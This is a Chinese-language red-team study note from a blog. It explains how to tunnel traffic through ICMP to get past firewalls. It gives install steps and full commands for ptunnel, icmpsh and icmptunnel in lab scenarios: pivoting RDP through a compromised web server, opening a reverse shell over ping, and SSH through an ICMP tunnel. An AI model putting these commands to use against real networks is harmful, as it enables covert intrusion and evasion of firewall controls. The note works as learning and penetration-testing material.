---
title: 【内网学习笔记】6、ICMP隧道工具使用
date: 2021-04-07 18:36:05
id: 210407-183605
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_15-43-51.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 1、介绍

在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。

因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。

## 2、建立 ICMP 隧道工具 

用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等

### ptunnel

ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：

```
yum -y install byacc
yum -y install flex bison

#安装libpcap依赖库
wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz
tar -xzvf libpcap-1.9.0.tar.gz
cd libpcap-1.9.0
./configure
make && make install

#安装PingTunnel
wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz
tar -xzvf PingTunnel-0.72.tar.gz
cd PingTunnel
make && make install
```

ptunnel 常用命令介绍：

```
-p: 指定跳板服务器 IP 地址
-lp: 监听本地 TCP 端口
-da: 指定访问目标的内网 IP 地址
-dp: 指定访问目标的端口
-m: 设置隧道最大并发数
-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）
-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）
-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）
```

目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。

```
Kali 攻击机       172.16.214.6 (外网)
|
|
Linux Web 跳板机  172.16.214.5  (外网)
|                192.168.7.5   (内网)
|
|
Win RDP 目标机    192.168.7.110 (内网)
```

在 Kali 攻击机上执行以下命令

```
ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix
```

```
-p  指定跳板机外网IP
-lp 指定本机的监听端口
-da 指定目标机的内网IP
-dp 指定目标机的端口
-x 设置隧道密码
```

在 Linux Web 跳板机上执行以下命令

```
ptunnel -x teamssix
```

之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_14-46-46.png)

### icmpsh

icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。

```
git clone https://github.com/inquisb/icmpsh.git #下载工具
apt-get install python-impacket # 安装依赖，或者 pip2 install impacket
sysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答
```

icmpsh 常用命令介绍：

```
-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]
-d milliseconds    请求时间间隔（毫秒）
-o milliseconds    响应超时时间（毫秒）
-s bytes           最大数据缓冲区大小（字节）
```

目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell

```
攻击机 IP：172.16.214.6
目标机 IP：172.16.214.2
```

在攻击机上运行：

```
python2 icmpsh_m.py 172.16.214.6 172.16.214.2
```

在目标机上运行

```
./icmpsh.exe -t 172.16.214.6
```

此时在攻击机上可以看到通过 icmp 协议建立的 shell

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_15-43-51.png)

### icmptunnel

 icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。

```
git clone https://github.com/jamesbarlow/icmptunnel.git
cd icmptunnel
make
```

目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。

```
攻击机 IP：172.16.214.6
目标机 IP：172.16.214.5
```

在攻击机上运行：

```
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all		# 禁用 ICMP echo 回复，防止内核自己对ping包进行响应
./icmptunnel -s	# 开启服务端模式
```

在攻击机上新开启一个终端运行：

```
/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0	# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)
```

在目标机上运行：

```
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
./icmptunnel 172.16.214.6
```

在目标机上新开启一个终端运行：

```
/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0	# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)
```

至此，已经通过 ICMP 建立了一个点对点隧道。

在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。

```
ssh root@10.0.0.2
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_16-35-09.png)

> 参考链接：
>
> [https://xz.aliyun.com/t/7875](https://xz.aliyun.com/t/7875)
>
> [https://www.freebuf.com/sectool/210450.html](https://www.freebuf.com/sectool/210450.html)
>
> [https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/](https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)